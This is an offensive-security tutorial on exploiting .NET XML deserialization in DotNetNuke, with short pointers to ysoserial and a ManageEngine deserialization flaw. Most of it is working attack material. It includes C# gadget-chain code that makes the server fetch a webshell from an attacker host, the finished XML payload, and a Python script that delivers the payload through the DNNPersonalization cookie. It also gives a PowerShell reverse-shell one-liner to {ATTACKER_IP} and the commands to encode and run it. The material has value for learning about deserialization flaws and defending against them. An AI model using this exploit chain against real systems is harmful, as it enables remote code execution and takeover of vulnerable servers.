---
title: Pwning serialization
tags:
  - advanced
  - web-app
  - pentesting
  - serialization
  - dotnet
  - ysoserial
  - java
---

This article covers serialization vulnerabilities in web applications,
particularly when web applications deserialize arbitrary attacker input,
converting that input into objects in process memory, and how an attacker can
chain deserialization gadgets to gain code execution.

## What is serialization?

Serialization describes the concept of converting data to an agreed upon
format, transmitting it to a consumer of said data, and then the consumer of
that data extracting the information from the serialized packet using the
defined format to receive the original data. A lot of different formats for
data can be considered serialization, for example:

- Base64 encoding
- JSON
- XML
- etc.

## DotNetNuke

Subsequent paragraphs will discuss some vulnerabilities discovered and
exploited in the [DotNetNuke](<https://en.wikipedia.org/wiki/DNN_(software)>)
web application, written in the .NET Framework. More in-depth whitepapers and
presentations related to deserialization attacks against .NET's
[BinaryFormatter](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.7.2)
and
[XmlSerializer](https://learn.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization)
are provided in the following resources:

- [Are you my type? - BlackHat](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [JSON Attacks - BlackHat](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)

### The vulnerability

The gist of DotNetNuke's vulnerability discussed in the presentation above is
that, provided a cookie named `DNNPersonalization` in XML format to a
nonexistent API endpoint, the DotNetNuke user profile business logic would
attempt to deserialize the contents and convert them to objects for storage in
a hash table, likely to load particular user profile information and display it
later.

The most interesting part about this vulnerability is that no type checking is
conducted on the object types stored within the XML data before
deserialization. If some type checking _was_ done prior to deserialization,
it's likely this vulnerability would be much more difficult to abuse.

### Gaining code execution

Plenty of gadgets are mentioned in the "JSON Attacks" presentation, but the
prime example used to gain code execution is the
[ObjectDataProvider](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netframework-4.7.2)
class. The **ObjectDataProvider** class allows us to wrap an arbitrary object
and call its methods, as well as provide parameters for these methods. This
class is used to created binding sources, objects that provide programmers with
relevant data and are bound to a target object, e.g. a TextBox, ComboBox, etc.,
to display data.

For code execution, since we can't call arbitrary methods of existing classes
directly, we use the **ObjectDataProvider** class as a gadget to load and
execute classes with methods of interest, e.g. the
**DotNetNuke.Common.Utilities.FileSystemUtils.PullFile** method that DotNetNuke
uses to download files from arbitrary internet locations.

Unfortunately, during deserialization with the **XmlSerializer** class, while
the **ObjectDataProvider** class is recognized by the deserialization routine,
**XmlSerializer** doesn't understand the object reference to the
**FileSystemUtils** within the class attribute. To remedy this, we can use
another gadget, the
[ExpandedWrapper](https://learn.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2)
class, to provide a generic class for deserialization by the **XmlSerializer**
class. Ultimately, this enables us to deserialize an **ObjectDataProvider**
class with our specified target class, **FileSystemUtils**, and our method(s),
for code execution, **PullFile**.

Below is a snippet of C# code targeting the .NET Framework, using these gadgets
to generate XML that can be deserialized by the **XmlSerializer** class to
download arbitrary files to the host via HTTP:

```csharp
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            Serialize();
        }
        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.45.156/webshell.aspx");
            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/webshell.aspx");


            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Windows\\Temp\\Payload.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }

    }
}
```

After building and executing the above C# application, an XML `Payload.txt`
file will be generated in `C:\Windows\Temp`. Upon deserialization of this
payload with **XmlSerializer**, the victim host deserializing the payload will
download `webshell.aspx` to its web root from the attacker host specified in
the payload.

Below is an example of the compiled payload:

```txt
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.156/webshell.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/webshell.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

### Getting a reverse shell

With our ability to pull arbitrary files from remote locations, we host the
`cmdasp.aspx` webshell file on our attacker host and coerce the victim host to
download the webshell to its web root. We then execute a PowerShell reverse
shell via the uploaded web shell on the victim host using our browser, gaining
an interactive shell with the victim host as the web server's user.

To find the `cmdasp.aspx` file on our Kali Linux installation, use the invoke
the following in Bash

```bash
locate cmdasp.aspx
```

The following Python script interacts with the DotNetNuke web application to
abuse the serialization vulnerability discussed, using our payload generated in
previous sections:

```python
import http.client
from argparse import ArgumentParser

import requests

http.client.HTTPConnection.debuglevel = 1
requests.packages.urllib3.disable_warnings()
API_ENDPOINT = "/dotnetnuke/doesnotexist"


class Solution:
    def __init__(self, url: str, lhost: str, filename: str) -> None:
        self.s = requests.Session()
        self.url = f"{url.rstrip("/")}{API_ENDPOINT}"
        self.lhost, self.filename = lhost, filename

    def solve(self) -> None:
        # Provide malicious cookie to target DNN serialization bug,
        # triggering PullFile to download 'self.filename' from
        # 'self.lhost'
        req = requests.Request(
            "GET",
            self.url,
            cookies={
                "DNNPersonalization": '<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://{lhost}/{filename}</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/{filename}</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'.format(
                    lhost=self.lhost, filename=self.filename
                )
            },
        )
        prepped = self.s.prepare_request(req)
        self.s.send(prepped, verify=False)


def main():
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", dest="url")
    parser.add_argument("-lh", "--lhost", dest="lhost")
    parser.add_argument("-f", "--filename", dest="filename")
    args = parser.parse_args()
    s = Solution(args.url, args.lhost, args.filename)
    s.solve()


if __name__ == "__main__":
    main()
```

After the webshell is uploaded to the target host, we can visit it at
`http://dnn/dotnetnuke/cmdasp.aspx`. From
[Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1),
we can execute the following PowerShell one-liner to initiate a reverse shell
over TCP with our attacker host:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

That's a lot of text and special characters. We can invoke the following in
Bash to convert our PowerShell one-liner to PowerShell-friendly Base64
encoding:

```bash
iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
```

Finally, we can execute our reverse shell payload on the target webshell with:

```cmd
powershell.exe -EncodedCommand {Base64Payload}
```

## ysoserial

In the above sections we discussed manually constructing our deserialization
payloads, however, security researchers have been so gracious as to construct
applications that can automatically generate these payloads with known, working
gadgets. **ysoserial** comes in two (2) different flavors that target both Java
and .NET:

- [ysoserial - Java](https://github.com/frohoff/ysoserial)
- [ysoserial - C#](https://github.com/pwntester/ysoserial.net)

## ManageEngine Applications Manager

**ManageEngine**, another regular offender, amongst its various SQL injection
vulnerabilities, also had an unauthenticated deserialization of arbitrary Java
objects that could be accessed by the Java Runtime Environment (JRE) from
remote hosts. This vulnerability is explained and abused in the article below:

- [ManageEngine Applications Manager Deserialization Unauthenticated RCE](https://blog.jamesotten.com/post/applications-manager-rce/)

## Related pages

- [[reversing-java-web-applications|Reversing Java web applications]]
